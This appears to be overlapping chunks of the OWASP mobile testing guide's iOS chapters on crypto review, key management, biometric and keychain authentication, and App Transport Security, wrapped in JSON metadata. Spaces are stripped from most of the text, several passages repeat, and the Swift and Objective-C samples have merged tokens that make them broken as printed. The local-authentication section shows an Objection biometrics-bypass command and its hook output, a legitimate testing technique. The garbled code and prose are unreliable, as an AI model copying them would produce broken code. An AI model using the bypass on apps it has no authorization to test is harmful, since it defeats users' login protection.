letisused,thenyoucreateanimmutablestructurewhichishardertowipefrommemory. Makesurethatitispartofa parentstructurewhichcanbeeasilyremovedfrommemory(e.g.astructthatlivestemporally). Ensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. Lookatinsecureand deprecatedalgorithmsandcommonconfigurationissues. CommonCryptor IftheappusesstandardcryptographicimplementationsprovidedbyApple, theeasiestwaytodeterminethestatusof therelatedalgorithmistocheckforcallstofunctionsfromCommonCryptor,suchasCCCryptandCCCryptorCreate. The sourcecodecontainsthesignaturesofallfunctionsofCommonCryptor.h. Forinstance,CCCryptorCreatehasfollowing signature: CCCryptorStatusCCCryptorCreate( CCOperationop, /*kCCEncrypt,etc.*/ CCAlgorithmalg, /*kCCAlgorithmDES,etc.*/ CCOptionsoptions, /*kCCOptionPKCS7Padding,etc.*/ const void *key, /*rawkeymaterial*/ size_t keyLength, const void *iv, /*optionalinitializationvector*/ CCCryptorRef *cryptorRef); /*RETURNED*/ Youcanthencomparealltheenumtypestodeterminewhichalgorithm,padding,andkeymaterialisused. Payattention tothekeyingmaterial: thekeyshouldbegeneratedsecurely-eitherusingakeyderivationfunctionorarandom-number generationfunction. Notethatfunctionswhicharenotedinchapter“CryptographyforMobileApps”asdeprecated,are stillprogrammaticallysupported. Theyshouldnotbeused. 419\\nThird party libraries Giventhecontinuousevolutionofallthirdpartylibraries,thisshouldnotbetheplacetoevaluateeachlibraryintermsof staticanalysis. Stilltherearesomepointsofattention: • Findthelibrarybeingused: Thiscanbedoneusingthefollowingmethods: – CheckthecartfileifCarthageisused. – CheckthepodfileifCocoapodsisused. – Checkthelinkedlibraries: Openthexcodeprojfileandchecktheprojectproperties. GototheBuildPhases tabandchecktheentriesinLinkBinaryWithLibrariesforanyofthelibraries. Seeearliersectionsonhow toobtainsimilarinformationusingMobSF. – Inthecaseofcopy-pastedsources: searchtheheaderfiles(incaseofusingObjective-C)andotherwisethe Swiftfilesforknownmethodnamesforknownlibraries. • Determinetheversionbeingused: Alwayschecktheversionofthelibrarybeingusedandcheckwhetherthere is a new version available in which possible vulnerabilities or shortcomings are patched. Even without a newer version of a library, it can be the case that cryptographic functions have not been reviewed yet. Therefore we always recommend using a library that has been validated or ensure that you have the ability, knowledge and experiencetodovalidationyourself. • Byhand?: Werecommendnottorollyourowncrypto,nortoimplementknowncryptographicfunctionsyourself. Testing Key Management Platform: ios MASVSV1: MSTG-CRYPTO-1,MSTG-CRYPTO-5 MASVSV2: MASVS-CRYPTO-2 Overview Static Analysis Therearevariouskeywordstolookfor: checkthelibrariesmentionedintheoverviewandstaticanalysisofthesection “VerifyingtheConfigurationofCryptographicStandardAlgorithms”forwhichkeywordsyoucanbestcheckonhowkeys arestored. Alwaysmakesurethat: • keysarenotsynchronizedoverdevicesifitisusedtoprotecthigh-riskdata. • keysarenotstoredwithoutadditionalprotection. • keysarenothardcoded. • keysarenotderivedfromstablefeaturesofthedevice. • keysarenothiddenbyuseoflowerlevellanguages(e.g.C/C++). • keysarenotimportedfromunsafelocations. Checkalsothelistofcommoncryptographicconfigurationissues. Mostoftherecommendationsforstaticanalysiscanalreadybefoundinchapter“TestingDataStorageforiOS”.Next,you canreaduponitatthefollowingpages: • AppleDeveloperDocumentation: Certificatesandkeys • AppleDeveloperDocumentation: Generatingnewkeys • AppleDeveloperDocumentation: Keygenerationattributes Dynamic Analysis Hookcryptographicmethodsandanalyzethekeysthatarebeingused. Monitorfilesystemaccesswhilecryptographic operationsarebeingperformedtoassesswherekeymaterialiswrittentoorreadfrom. 420\\nTesting Random Number Generation Platform: ios MASVSV1: MSTG-CRYPTO-6 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 142
    }
  },
  {
    "text": "Overview Static Analysis Therearevariouskeywordstolookfor: checkthelibrariesmentionedintheoverviewandstaticanalysisofthesection “VerifyingtheConfigurationofCryptographicStandardAlgorithms”forwhichkeywordsyoucanbestcheckonhowkeys arestored. Alwaysmakesurethat: • keysarenotsynchronizedoverdevicesifitisusedtoprotecthigh-riskdata. • keysarenotstoredwithoutadditionalprotection. • keysarenothardcoded. • keysarenotderivedfromstablefeaturesofthedevice. • keysarenothiddenbyuseoflowerlevellanguages(e.g.C/C++). • keysarenotimportedfromunsafelocations. Checkalsothelistofcommoncryptographicconfigurationissues. Mostoftherecommendationsforstaticanalysiscanalreadybefoundinchapter“TestingDataStorageforiOS”.Next,you canreaduponitatthefollowingpages: • AppleDeveloperDocumentation: Certificatesandkeys • AppleDeveloperDocumentation: Generatingnewkeys • AppleDeveloperDocumentation: Keygenerationattributes Dynamic Analysis Hookcryptographicmethodsandanalyzethekeysthatarebeingused. Monitorfilesystemaccesswhilecryptographic operationsarebeingperformedtoassesswherekeymaterialiswrittentoorreadfrom. 420\\nTesting Random Number Generation Platform: ios MASVSV1: MSTG-CRYPTO-6 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis InSwift,theSecRandomCopyBytesAPIisdefinedasfollows: funcSecRandomCopyBytes(_rnd:SecRandomRef?, _count:Int, _bytes:UnsafeMutablePointer<UInt8>)->Int32 TheObjective-Cversionis intSecRandomCopyBytes(SecRandomRefrnd,size_tcount,uint8_t *bytes); ThefollowingisanexampleoftheAPIsusage: intresult =SecRandomCopyBytes(kSecRandomDefault,16,randomBytes); Note: ifothermechanismsareusedforrandomnumbersinthecode, verifythattheseareeitherwrappersaroundthe APIsmentionedaboveorreviewthemfortheirsecure-randomness. Oftenthisistoohard,whichmeansyoucanbeststick withtheimplementationabove. Dynamic Analysis Ifyouwanttotestforrandomness,youcantrytocapturealargesetofnumbersandcheckwithBurp’ssequencerplugin toseehowgoodthequalityoftherandomnessis. 421\\niOS Local Authentication Overview During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that userscanmoreconvenientlyresumeanexistingsessionwitharemoteserviceorasameansofstep-upauthentication toprotectsomecriticalfunction. Asstatedbeforeinchapter“MobileAppAuthenticationArchitectures”: Thetestershouldbeawarethatlocalauthentica- tionshouldalwaysbeenforcedataremoteendpointorbasedonacryptographicprimitive. Attackerscaneasilybypass localauthenticationifnodatareturnsfromtheauthenticationprocess. A variety of methods are available for integrating local authentication into apps. The Local Authentication framework provides a set of APIs for developers to extend an authentication dialog to a user. In the context of connecting to a remoteservice,itispossible(andrecommended)toleveragethekeychainforimplementinglocalauthentication. FingerprintauthenticationoniOSisknownasTouchID.ThefingerprintIDsensorisoperatedbytheSecureEnclavesecurity coprocessoranddoesnotexposefingerprintdatatoanyotherpartsofthesystem. NexttoTouchID,Appleintroduced FaceID:whichallowsauthenticationbasedonfacialrecognition. BothusesimilarAPIsonanapplicationlevel,theactual methodofstoringthedataandretrievingthedata(e.g.facialdataorfingerprintrelateddataisdifferent). DevelopershavetwooptionsforincorporatingTouchID/FaceIDauthentication: • LocalAuthentication.frameworkisahigh-levelAPIthatcanbeusedtoauthenticatetheuserviaTouchID.The appcan’taccessanydataassociatedwiththeenrolledfingerprintandisnotifiedonlywhetherauthenticationwas successful. • Security.frameworkisalowerlevelAPItoaccesskeychainservices. Thisisasecureoptionifyourappneedsto protect some secret data with biometric authentication, since the access control is managed on a system-level and can not easily be bypassed. Security.framework has a C API, but there are several open source wrap- pers available, making access to the keychain as simple as to NSUserDefaults. Security.framework underlies LocalAuthentication.framework;Applerecommendstodefaulttohigher-levelAPIswheneverpossible. Please be aware that using either the LocalAuthentication.framework or the Security.framework, will be a control thatcanbebypassedbyanattackerasitdoesonlyreturnabooleanandnodatatoproceedwith. SeeDon’ttouchme thatway,byDavidLindneretalformoredetails. Local Authentication Framework TheLocalAuthenticationframeworkprovidesfacilitiesforrequestingapassphraseorTouchIDauthenticationfromusers. DeveloperscandisplayandutilizeanauthenticationpromptbyutilizingthefunctionevaluatePolicyoftheLAContext class. Twoavailablepoliciesdefineacceptableformsofauthentication: • deviceOwnerAuthentication(Swift)or LAPolicyDeviceOwnerAuthentication(Objective-C):Whenavailable, the userispromptedtoperformTouchIDauthentication. IfTouchIDisnotactivated,thedevicepasscodeisrequested instead. Ifthedevicepasscodeisnotenabled,policyevaluationfails. • deviceOwnerAuthenticationWithBiometrics (Swift) or LAPolicyDeviceOwnerAuthenticationWithBiomet- rics(Objective-C):AuthenticationisrestrictedtobiometricswheretheuserispromptedforTouchID. TheevaluatePolicyfunctionreturnsabooleanvalueindicatingwhethertheuserhasauthenticatedsuccessfully. TheAppleDeveloperwebsiteofferscodesamplesforbothSwiftandObjective-C.AtypicalimplementationinSwiftlooks asfollows. letcontext =LAContext() varerror:NSError? guard context.canEvaluatePolicy(.deviceOwnerAuthentication,error:&error)else { //Couldnotevaluatepolicy;lookaterrorandpresentanappropriatemessagetouser 422\\n} context.evaluatePolicy(.deviceOwnerAuthentication,localizedReason:\"Please,passauthorizationtoenterthisarea\"){success,evaluationError in guard success else { //Userdidnotauthenticatesuccessfully,lookatevaluationErrorandtakeappropriateaction } //Userauthenticatedsuccessfully,takeappropriateaction } Using Keychain Services for Local Authentication TheiOSkeychainAPIscan(andshould)beusedtoimplementlocalauthentication. Duringthisprocess,theappstores either a secret authentication token or another piece of secret data identifying the user in the keychain. In order to authenticatetoaremoteservice,theusermustunlockthekeychainusingtheirpassphraseorfingerprinttoobtainthe secretdata. ThekeychainallowssavingitemswiththespecialSecAccessControlattribute,whichwillallowaccesstotheitemfrom thekeychainonlyaftertheuserhaspassedTouchIDauthentication(orpasscode,ifsuchafallbackisallowedbyattribute parameters). In the following example we will save the string “test_strong_password” to the keychain. The string can be ac- cessed only on the current device while the passcode is set (kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly parameter) and after Touch ID authentication for the currently enrolled fingers only (SecAccessControlCreateFlags. biometryCurrentSetparameter): Swift //1.CreatetheAccessControlobjectthatwillrepresentauthenticationsettings varerror:Unmanaged<CFError>? guard letaccessControl =SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, SecAccessControlCreateFlags.biometryCurrentSet, &error)else { //failedtocreateAccessControlobject return } //2.Createthekeychainservicesquery.PayattentionthatkSecAttrAccessControlismutuallyexclusivewithkSecAttrAccessibleattribute varquery:[String:Any]=[:] query[kSecClass asString]=kSecClassGenericPassword query[kSecAttrLabel asString]=\"com.me.myapp.password\" asCFString query[kSecAttrAccount asString]=\"OWASPAccount\" asCFString query[kSecValueData asString]=\"test_strong_password\".data(using:.utf8)!as CFData query[kSecAttrAccessControl asString]=accessControl //3.Savetheitem letstatus =SecItemAdd(query asCFDictionary,nil) ifstatus ==noErr { //successfullysaved }else { //errorwhilesaving } //4.Nowwecanrequestthesaveditemfromthekeychain.Keychainserviceswillpresenttheauthenticationdialogto theuserandreturndataornildepending ↪ onwhetherasuitablefingerprintwasprovidedornot. //5.Createthequery varquery =[String:Any]() query[kSecClass asString]=kSecClassGenericPassword query[kSecReturnData asString]=kCFBooleanTrue query[kSecAttrAccount asString]=\"MyName\" asCFString query[kSecAttrLabel asString]=\"com.me.myapp.password\" asCFString query[kSecUseOperationPrompt asString]=\"Please,passauthorisationtoenterthisarea\" asCFString //6.Gettheitem varqueryResult:AnyObject? letstatus =withUnsafeMutablePointer(to:&queryResult){ SecItemCopyMatching(query asCFDictionary,UnsafeMutablePointer($0)) } 423\\nifstatus ==noErr { letpassword =String(data:queryResult as!Data,encoding:.utf8)! //successfullyreceivedpassword }else { //authorizationnotpassed } Objective-C //1.CreatetheAccessControlobjectthatwillrepresentauthenticationsettings CFErrorRef *err=nil; SecAccessControlRefsacRef =SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, kSecAccessControlUserPresence, err); //2.Createthekeychainservicesquery.PayattentionthatkSecAttrAccessControlismutuallyexclusivewithkSecAttrAccessibleattribute NSDictionary*query =@{ (__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecAttrLabel:@\"com.me.myapp.password\", (__bridgeid)kSecAttrAccount:@\"OWASPAccount\", (__bridgeid)kSecValueData:[@\"test_strong_password\" dataUsingEncoding:NSUTF8StringEncoding], (__bridgeid)kSecAttrAccessControl:(__bridge_transferid)sacRef }; //3.Savetheitem OSStatusstatus =SecItemAdd((__bridgeCFDictionaryRef)query,nil); if(status ==noErr){ //successfullysaved }else { //errorwhilesaving } //4.Nowwecanrequestthesaveditemfromthekeychain.Keychainserviceswillpresenttheauthenticationdialogto theuserandreturndataornildepending ↪ onwhetherasuitablefingerprintwasprovidedornot. //5.Createthequery NSDictionary *query =@{(__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecReturnData:@YES, (__bridgeid)kSecAttrAccount:@\"MyName1\", (__bridgeid)kSecAttrLabel:@\"com.me.myapp.password\", (__bridgeid)kSecUseOperationPrompt:@\"Please,passauthorisationtoenterthisarea\" }; //6.Gettheitem CFTypeRefqueryResult =NULL; OSStatusstatus",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 143
    }
  },
  {
    "text": "}else { //authorizationnotpassed } Objective-C //1.CreatetheAccessControlobjectthatwillrepresentauthenticationsettings CFErrorRef *err=nil; SecAccessControlRefsacRef =SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, kSecAccessControlUserPresence, err); //2.Createthekeychainservicesquery.PayattentionthatkSecAttrAccessControlismutuallyexclusivewithkSecAttrAccessibleattribute NSDictionary*query =@{ (__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecAttrLabel:@\"com.me.myapp.password\", (__bridgeid)kSecAttrAccount:@\"OWASPAccount\", (__bridgeid)kSecValueData:[@\"test_strong_password\" dataUsingEncoding:NSUTF8StringEncoding], (__bridgeid)kSecAttrAccessControl:(__bridge_transferid)sacRef }; //3.Savetheitem OSStatusstatus =SecItemAdd((__bridgeCFDictionaryRef)query,nil); if(status ==noErr){ //successfullysaved }else { //errorwhilesaving } //4.Nowwecanrequestthesaveditemfromthekeychain.Keychainserviceswillpresenttheauthenticationdialogto theuserandreturndataornildepending ↪ onwhetherasuitablefingerprintwasprovidedornot. //5.Createthequery NSDictionary *query =@{(__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecReturnData:@YES, (__bridgeid)kSecAttrAccount:@\"MyName1\", (__bridgeid)kSecAttrLabel:@\"com.me.myapp.password\", (__bridgeid)kSecUseOperationPrompt:@\"Please,passauthorisationtoenterthisarea\" }; //6.Gettheitem CFTypeRefqueryResult =NULL; OSStatusstatus =SecItemCopyMatching((__bridgeCFDictionaryRef)query,&queryResult); if(status ==noErr){ NSData*resultData =(__bridge_transferNSData*)queryResult; NSString*password =[[NSStringalloc]initWithData:resultDataencoding:NSUTF8StringEncoding]; NSLog(@\"%@\",password); }else { NSLog(@\"Somethingwentwrong\"); } Note regarding temporariness of keys in the Keychain UnlikemacOSandAndroid,iOSdoesnotsupporttemporarinessofanitem’saccessibilityinthekeychain: whenthereis noadditionalsecuritycheckwhenenteringthekeychain(e.g.kSecAccessControlUserPresenceorsimilarisset),then oncethedeviceisunlocked,akeywillbeaccessible. Testing Local Authentication Platform: ios MASVSV1: MSTG-AUTH-8,MSTG-STORAGE-11 MASVSV2: MASVS-AUTH-2 424\\nOverview Theusageofframeworksinanappcanbedetectedbyanalyzingtheappbinary’slistofshareddynamiclibraries. This canbedonebyusingotool: otool -L<AppName>.app/<AppName> IfLocalAuthentication.frameworkisusedinanapp,theoutputwillcontainbothofthefollowinglines(rememberthat LocalAuthentication.frameworkusesSecurity.frameworkunderthehood): /System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication /System/Library/Frameworks/Security.framework/Security IfSecurity.frameworkisused,onlythesecondonewillbeshown. Static Analysis It is important to remember that the LocalAuthentication framework is an event-based procedure and as such, should not be the sole method of authentication. Though this type of authentication is effective on the user-interface level, it iseasilybypassedthroughpatchingorinstrumentation. Therefore,itisbesttousethekeychainservicemethod,which meansyoushould: • Verifythatsensitiveprocesses,suchasre-authenticatingauserperformingapaymenttransaction,areprotected usingthekeychainservicesmethod. • Verifythataccesscontrolflagsaresetforthekeychainitemwhichensurethatthedataofthekeychainitemcan onlybeunlockedbymeansofauthenticatingtheuser. Thiscanbedonewithoneofthefollowingflags: – kSecAccessControlBiometryCurrentSet (before iOS 11.3 kSecAccessControlTouchIDCurrentSet). This willmakesurethatauserneedstoauthenticatewithbiometrics(e.g.FaceIDorTouchID)beforeaccessing thedatainthekeychainitem. Whenevertheuseraddsafingerprintorfacialrepresentationtothedevice,it willautomaticallyinvalidatetheentryintheKeychain. Thismakessurethatthekeychainitemcanonlyever beunlockedbyusersthatwereenrolledwhentheitemwasaddedtothekeychain. – kSecAccessControlBiometryAny(beforeiOS11.3kSecAccessControlTouchIDAny). Thiswillmakesurethat a user needs to authenticate with biometrics (e.g. Face ID or Touch ID) before accessing the data in the Keychainentry. TheKeychainentrywillsurviveany(re-)enrolingofnewfingerprintsorfacialrepresentation. Thiscanbeveryconvenientiftheuserhasachangingfingerprint. However,italsomeansthatattackers,who aresomehowabletoenroletheirfingerprintsorfacialrepresentationstothedevice, cannowaccessthose entriesaswell. – kSecAccessControlUserPresence can be used as an alternative. This will allow the user to authenticate through a passcode if the biometric authentication no longer works. This is considered to be weaker than kSecAccessControlBiometryAny since it is much easier to steal someone’s passcode entry by means of shouldersurfing,thanitistobypasstheTouchIDorFaceIDservice. • Inordertomakesurethatbiometricscanbeused,verifythatthekSecAttrAccessibleWhenPasscodeSetThisDe- viceOnlyorthekSecAttrAccessibleWhenPasscodeSetprotectionclassissetwhentheSecAccessControlCre- ateWithFlagsmethodiscalled. Notethatthe...ThisDeviceOnlyvariantwillmakesurethatthekeychainitem isnotsynchronizedwithotheriOSdevices. Note,adataprotectionclassspecifiestheaccessmethodologyusedtosecurethedata. Eachclassusesdifferent policiestodeterminewhenthedataisaccessible. Dynamic Analysis Objection Biometrics Bypass can be used to bypass LocalAuthentication. Objection uses Frida to instrument theeval- uatePolicy function so that it returns True even if authentication was not successfully performed. Use the ios ui biometrics_bypasscommandtobypasstheinsecurebiometricauthentication. Objectionwillregisterajob,whichwill replacetheevaluatePolicyresult. Itwillworkinboth,SwiftandObjective-Cimplementations. 425\\n...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosuibiometrics_bypass (agent)Registeringjob3mhtws9x47q.Type:ios-biometrics-disable ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #(agent)[3mhtws9x47q]LocalizedReasonforauthrequirement:Pleaseauthenticateyourself (agent)[3mhtws9x47q]OSauthenticationresponse:false (agent)[3mhtws9x47q]MarkingOSresponseasTrueinstead (agent)[3mhtws9x47q]Biometricsbypasshookcomplete Ifvulnerable,themodulewillautomaticallybypasstheloginform. 426\\niOS Network Communication Overview AlmosteveryiOSappactsasaclienttooneormoreremoteservices. Asthisnetworkcommunicationusuallytakesplace overuntrustednetworkssuchaspublicWi-Fi,classicalnetworkbased-attacksbecomeapotentialissue. Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and sup- ported. iOS App Transport Security Starting with iOS 9, Apple introduced App Transport Security (ATS) which is a set of security checks enforced by the operatingsystemforconnectionsmadeusingtheURLLoadingSystem(typicallyviaURLSession)toalwaysuseHTTPS. AppsshouldfollowApple’sbestpracticestoproperlysecuretheirconnections. WatchATSIntroductoryVideofromtheAppleWWDC2015. ATSperformsdefaultservertrustevaluationandrequiresaminimumsetofsecurityrequirements. DefaultServerTrustEvaluation: When an app connects to a remote server, the server provides its identity using an X.509 digital certificate. The ATS defaultservertrustevaluationincludesvalidatingthatthecertificate: • Isn’texpired. • Hasanamethatmatchestheserver’sDNSname. • Has a digital signature that is valid (hasn’t been tampered with) and can be traced back to a trusted Certificate Authority(CA)includedintheoperatingsystemTrustStore, orbeinstalledontheclientbytheuserorasystem administrator. MinimumSecurityRequirementsforConnections: ATSwillblockconnectionsthatfurtherfailtomeetasetofminimumsecurityrequirementsincluding: • TLSversion1.2orgreater. • DataencryptionwithAES-128orAES-256. • ThecertificatemustbesignedwithanRSAkey(2048bitsorgreater),oranECCkey(256bitsorgreater). • Thecertificate’sfingerprintmustuseSHA-256orgreater. • Thelinkmustsupportperfectforwardsecrecy(PFS)throughEllipticCurveDiffie-HellmanEphemeral(ECDHE)key exchange. Certificatevaliditychecking: AccordingtoApple,“evaluatingthetrustedstatusofaTLScertificateisperformedinaccordancewithestablishedindustry standards,assetoutinRFC5280,andincorporatesemergingstandardssuchasRFC6962(CertificateTransparency). In iOS 11 or later, Apple devices are periodically updated with a current list of revoked and constrained certificates. The list is aggregated from certificate revocation lists (CRLs), which are published by each of the built-in root certificate authorities trusted by Apple, as well as by their subordinate CA issuers. The list may also include other constraints at Apple’sdiscretion. ThisinformationisconsultedwheneveranetworkAPIfunctionisusedtomakeasecureconnection. If there are too many revoked certificates from a CA to list individually, a trust evaluation may instead require that an onlinecertificatestatusresponse(OCSP)isneeded,andiftheresponseisn’tavailable,thetrustevaluationwillfail.” When does ATS not apply? • Whenusinglower-levelAPIs: ATSonlyappliestotheURLLoadingSystemincludingURLSessionandAPIslayered ontopofthem.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 144
    }
  },
  {
    "text": "Apple, as well as by their subordinate CA issuers. The list may also include other constraints at Apple’sdiscretion. ThisinformationisconsultedwheneveranetworkAPIfunctionisusedtomakeasecureconnection. If there are too many revoked certificates from a CA to list individually, a trust evaluation may instead require that an onlinecertificatestatusresponse(OCSP)isneeded,andiftheresponseisn’tavailable,thetrustevaluationwillfail.” When does ATS not apply? • Whenusinglower-levelAPIs: ATSonlyappliestotheURLLoadingSystemincludingURLSessionandAPIslayered ontopofthem. Itdoesnotapplytoappsthatuselower-levelAPIs(likeBSDSockets),includingthosethatimplement TLSontopofthoselower-levelAPIs(seesection“UsingATSinAppleFrameworks”fromtheArchivedAppleDeveloper Documentation). 427\\n• When connecting to IP addresses, unqualified domain names or local hosts: ATSappliesonlytoconnec- tions made to public host names (see section “Availability of ATS for Remote and Local Connections” from the ArchivedAppleDeveloperDocumentation). ThesystemdoesnotprovideATSprotectiontoconnectionsmadeto: – Internetprotocol(IP)addresses – Unqualifiedhostnames – Localhostsemployingthe.localtop-leveldomain(TLD) • When including ATS Exceptions: If the app uses the ATS compatible APIs, it can still disable ATS for specific scenariosusingATSExceptions. Learnmore: • “ATSandiOSenterpriseappswithprivatenetworks” • “ATSandlocalIPaddresses” • “ATSimpactonappsuse3rdpartylibraries” • “ATSandSSLpinning/ownCA” ATS Exceptions ATS restrictions can be disabled by configuring exceptions in the Info.plist file under the NSAppTransportSecurity key. Theseexceptionscanbeappliedto: • allowinsecureconnections(HTTP), • lowertheminimumTLSversion, • disablePerfectForwardSecrecy(PFS)or • allowconnectionstolocaldomains. ATS exceptions can be applied globally or per domain basis. The application can globally disable ATS, but opt in for individualdomains. ThefollowinglistingfromAppleDeveloperdocumentationshowsthestructureoftheNSAppTrans- portSecuritydictionary. NSAppTransportSecurity :Dictionary { NSAllowsArbitraryLoads :Boolean NSAllowsArbitraryLoadsForMedia :Boolean NSAllowsArbitraryLoadsInWebContent :Boolean NSAllowsLocalNetworking :Boolean NSExceptionDomains :Dictionary { <domain-name-string>:Dictionary { NSIncludesSubdomains :Boolean NSExceptionAllowsInsecureHTTPLoads :Boolean NSExceptionMinimumTLSVersion :String NSExceptionRequiresForwardSecrecy :Boolean //DefaultvalueisYES NSRequiresCertificateTransparency :Boolean } } } Source: AppleDeveloperDocumentation. ThefollowingtablesummarizestheglobalATSexceptions. Formoreinformationabouttheseexceptions,pleasereferto table2intheofficialAppledeveloperdocumentation. Key Description NSAllowsArbitraryLoads DisableATSrestrictionsgloballyexceptsforindividual domainsspecifiedunderNSExceptionDomains NSAllowsArbitraryLoadsInWebContent DisableATSrestrictionsforalltheconnectionsmade fromwebviews NSAllowsLocalNetworking Allowconnectiontounqualifieddomainnamesand .localdomains NSAllowsArbitraryLoadsForMedia DisableallATSrestrictionsformedialoadedthrough theAVFoundationsframework 428\\nThe following table summarizes the per-domain ATS exceptions. For more information about these exceptions, please refertotable3intheofficialAppledeveloperdocumentation. Key Description NSIncludesSubdomains IndicateswhetherATSexceptionsshouldapplyto subdomainsofthenameddomain NSExceptionAllowsInsecureHTTPLoads AllowsHTTPconnectionstothenameddomain,but doesnotaffectTLSrequirements NSExceptionMinimumTLSVersion AllowsconnectionstoserverswithTLSversionsless than1.2 NSExceptionRequiresForwardSecrecy Disableperfectforwardsecrecy(PFS) JustifyingExceptions: Starting from January 1 2017, Apple App Store review requires justification if one of the following ATS exceptions are defined. • NSAllowsArbitraryLoads • NSAllowsArbitraryLoadsForMedia • NSAllowsArbitraryLoadsInWebContent • NSExceptionAllowsInsecureHTTPLoads • NSExceptionMinimumTLSVersion Thismustbecarefullyrevisedtodetermineifit’sindeedpartoftheappintendedpurpose. Applewarnsaboutexceptions reducing the security of the apps and advises to configure exceptions only when needed and prefer to server fixeswhenfacedwithanATSfailure. Example: Inthefollowingexample,ATSisgloballyenabled(there’snoglobalNSAllowsArbitraryLoadsdefined)butanexceptionis explicitlysetfortheexample.comdomain(anditssubdomains). Consideringthatthedomainisownedbytheapplication developersandthere’saproperjustificationthisexceptionwouldbeacceptable,sinceitmaintainsallthebenefitsofATS forallotherdomains. However,itwouldbealwayspreferabletofixtheserverasindicatedabove. <key>NSAppTransportSecurity</key> <dict> <key>NSExceptionDomains</key> <dict> <key>example.com</key> <dict> <key>NSIncludesSubdomains</key> <true/> <key>NSExceptionMinimumTLSVersion</key> <string>TLSv1.2</string> <key>NSExceptionAllowsInsecureHTTPLoads</key> <true/> <key>NSExceptionRequiresForwardSecrecy</key> <true/> </dict> </dict> </dict> FormoreinformationonATSexceptionspleaseconsultsection“ConfigureExceptionsOnlyWhenNeeded;PreferServer Fixes”fromthearticle“PreventingInsecureNetworkConnections”intheAppleDeveloperDocumentationandtheblog postonATS. Server Trust Evaluation ATSimposesextendedsecuritychecksthatsupplementthedefaultservertrustevaluationprescribedbytheTransport LayerSecurity(TLS)protocol. LooseningATSrestrictionsreducesthesecurityoftheapp. Appsshouldpreferalternative waystoimproveserversecuritybeforeaddingATSexceptions. TheAppleDeveloperDocumentationexplainsthatanappcanuseURLSessiontoautomaticallyhandleservertrusteval- uation. However,appsarealsoabletocustomizethatprocess,forexampletheycan: 429\\n• bypassorcustomizecertificateexpiry. • loosen/extendtrust: acceptservercredentialsthatwouldotherwiseberejectedbythesystem,e.g.tomakesecure connectionstoadevelopmentserverusingself-signedcertificatesembeddedintheapp. • tightentrust: rejectcredentialsthatwouldotherwisebeacceptedbythesystem. • etc. References: • PreventingInsecureNetworkConnections • PerformingManualServerTrustAuthentication • Certificate,Key,andTrustServices iOS Network APIs Since iOS 12.0 the Network framework and the URLSession class provide methods to load network and URL requests asynchronouslyandsynchronously. OlderiOSversionscanutilizetheSocketsAPI. Network Framework The Network framework was introduced at The Apple Worldwide Developers Conference (WWDC) in 2018 and is a re- placementtotheSocketsAPI.Thislow-levelnetworkingframeworkprovidesclassestosendandreceivedatawithbuilt indynamicnetworking,securityandperformancesupport. TLS1.3isenabledbydefaultintheNetworkframework,iftheargumentusing: .tlsisused. Itisthepreferredoption overthelegacySecureTransportframework. URLSession URLSessionwasbuiltupontheNetworkframeworkandutilizesthesametransportservices. TheclassalsousesTLS1.3 bydefault,iftheendpointisHTTPS. URLSession should be used for HTTP and HTTPS connections, instead of utilizing the Network framework directly. TheURLSessionclassnativelysupportsbothURLschemesandisoptimizedforsuchconnections. Itrequiresless boilerplatecode,reducingthepossibilityforerrorsandensuringsecureconnectionsbydefault. TheNetworkframework shouldonlybeusedwhentherearelow-leveland/oradvancednetworkingrequirements. TheofficialAppledocumentationincludesexamplesofusingtheNetworkframeworktoimplementnetcatandURLSession tofetchwebsitedataintomemory. Testing the TLS Settings Platform: ios MASVSV1: MSTG-NETWORK-2 MASVSV2: MASVS-NETWORK-1 430\\nOverview Remembertoinspectthecorrespondingjustificationstodiscardthatitmightbepartoftheappintendedpurpose. ItispossibletoverifywhichATSsettingscanbeusedwhencommunicatingtoacertainendpoint. OnmacOSthecommand line utility nscurl can be used. A permutation of different settings will be executed and verified against the specified endpoint. If the default ATS secure connection test is passing, ATS can be used in its default secure configuration. If thereareanyfailsinthenscurloutput,pleasechangetheserversideconfigurationofTLStomaketheserversidemore secure,ratherthanweakeningtheconfigurationinATSontheclient. Seethearticle“IdentifyingtheSourceofBlocked Connections”intheAppleDeveloperDocumentationformoredetails. Refertosection“VerifyingtheTLSSettings”inchapterTestingNetworkCommunicationfordetails. Testing Custom Certificate Stores and Certificate Pinning Platform:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 145
    }
  },
  {
